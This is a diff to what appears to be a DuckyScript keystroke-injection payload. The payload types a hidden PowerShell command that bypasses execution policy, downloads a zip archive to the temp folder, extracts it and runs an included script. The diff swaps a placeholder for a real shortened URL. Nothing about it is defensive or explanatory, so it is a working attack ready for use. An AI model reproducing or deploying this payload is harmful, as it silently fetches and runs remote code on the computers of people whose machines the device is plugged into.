@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'link to zip' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'shorturl.at/moqG0' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
 ENTER
